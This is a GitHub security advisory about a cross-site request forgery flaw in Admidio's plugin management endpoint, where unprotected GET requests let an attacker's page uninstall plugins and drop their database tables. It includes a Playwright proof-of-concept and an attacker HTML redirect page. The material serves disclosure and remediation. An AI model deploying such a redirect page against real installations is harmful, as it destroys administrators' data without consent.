# [M] Admidio: CSRF on Plugin Install, Uninstall, and Update via Unprotected GET Requests

## Summary
Severity: Medium
Advisory: GHSA-hm42-q32m-vj4f
CVE: CVE-2026-53760
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-07-09
Source: https://github.com/advisories/GHSA-hm42-q32m-vj4f
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0

## Details
## Summary

The `modules/plugins.php` endpoint handles plugin installation, uninstallation, and update operations via GET requests without CSRF token validation. Because these are top-level navigations, browsers include `SameSite=Lax` session cookies. An attacker crafts a malicious page that, when an authenticated administrator visits it, triggers arbitrary plugin operations. The uninstall operation executes DROP TABLE SQL scripts and destroys plugin data.

## Details

`modules/plugins.php` reads the `mode` (install, uninstall, update) and `name` parameters directly from `$_GET`:

```php
// modules/plugins.php
$mode = admFuncVariableIsValid($_GET, 'mode', 'string');
$pluginName = admFuncVariableIsValid($_GET, 'name', 'string');
```

The file contains zero calls to `SecurityUtils::validateCsrfToken()`. Other administrative operations in the same codebase (such as the `save` mode in preferences) validate CSRF tokens correctly.

Because the operations use GET requests, modern browsers send `SameSite=Lax` cookies on top-level GET navigations (link clicks, redirects, `window.location` assignments). A cross-origin page triggers these operations by navigating the browser to the vulnerable URL.

The `doUninstall()` function is the most destructive path. It executes SQL scripts from the plugin's `db_scripts/` directory, which contain `DROP TABLE` statements:

```php
// modules/plugins.php - doUninstall()
function doUninstall($pluginFolder) {
    // Reads and executes SQL from $pluginFolder/db_scripts/uninstall.sql
    // Contains DROP TABLE statements
}
```

## Proof of Concept

The following Playwright test demonstrates a cross-origin CSRF attack. An attacker hosts a page on a different origin that redirects an authenticated administrator's browser to the uninstall endpoint:

```javascript
// playwright-csrf-poc.js
const { test, expect } = require('@playwright/test');

test('CSRF plugin uninstall via cross-origin redirect', async ({ browser }) => {
    const context = await browser.newContext();
    const page = await context.newPage();

    // Step 1: Admin logs in to Admidio
    await page.goto('https://admidio.example.com/adm_program/system/login.php');
    await page.fill('#usr_login_name', 'admin');
    await page.fill('#usr_password', 'password');
    await page.click('#btn_login');
    await page.waitForURL('**/overview.php');

    // Step 2: Admin visits attacker-controlled page on different origin
    // The attacker page contains:
    //   <script>window.location = 'https://admidio.example.com/adm_program/modules/plugins.php?mode=uninstall&name=birthday';</script>
    await page.goto('https://attacker.example.com/csrf.html');

    // Step 3: Browser follows redirect with SameSite=Lax cookies
    // The birthday plugin is uninstalled, its database tables dropped
    await page.waitForURL('**/plugins.php*');

    // Verify the plugin was uninstalled
    await page.goto('https://admidio.example.com/adm_program/modules/plugins.php');
    const content = await page.content();
    expect(content).not.toContain('birthday');
});
```

Simplified attacker page (`csrf.html` hosted on attacker origin):

```html
<html>
<body>
<script>
  window.location = 'https://admidio.example.com/adm_program/modules/plugins.php?mode=uninstall&name=birthday';
</script>
</body>
</html>
```

When an administrator visits this page, the browser navigates to the Admidio uninstall URL with full session cookies, and the server uninstalls the birthday plugin.

## Impact

An unauthenticated attacker tricks an Admidio administrator into visiting a malicious web page (via phishing, forum post, or embedded content) that performs plugin operations without visible indication. The `uninstall` operation executes DROP TABLE statements, causing irreversible data loss. The `install` operation activates plugins with known vulnerabilities. The `update` operation disrupts plugin functionality. The victim only needs to visit a single page.

## Recommended Fix

Switch plugin install, uninstall, and update operations from GET to POST requests. Add `SecurityUtils::validateCsrfToken()` checks to all state-changing operations in `modules/plugins.php`, consistent with the pattern used elsewhere in the codebase.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-hm42-q32m-vj4f
- https://github.com/Admidio/admidio
